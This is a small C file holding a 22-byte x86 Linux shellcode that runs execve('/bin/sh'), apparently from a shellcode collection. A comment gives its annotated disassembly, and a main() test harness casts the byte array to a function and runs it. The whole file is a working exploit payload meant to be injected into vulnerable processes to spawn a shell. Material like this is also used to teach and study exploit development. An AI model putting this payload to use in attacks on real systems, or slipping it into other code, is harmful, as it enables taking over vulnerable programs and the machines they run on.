#include <stdio.h>

/*

execve /bin/sh -- 22 Bytes -- 17JAN2017 -- icon

0:  31 c9                   xor    ecx,ecx
2:  89 ca                   mov    edx,ecx
4:  51                      push   ecx
5:  68 2f 2f 73 68          push   0x68732f2f
a:  68 2f 62 69 6e          push   0x6e69622f
f:  89 e3                   mov    ebx,esp
11: 6a 0b                   push   0xb
13: 58                      pop    eax
14: cd 80                   int    0x80
*/

char execve_sh[] = \
"\x31\xC9\x89\xCA\x51\x68\x2F\x2F\x73\x68\x68"
"\x2F\x62\x69\x6E\x89\xE3\x6A\x0B\x58\xCD\x80";

int main(int argc, char **argv){
  int (*test)() = (int(*)())execve_sh;
  test();
}
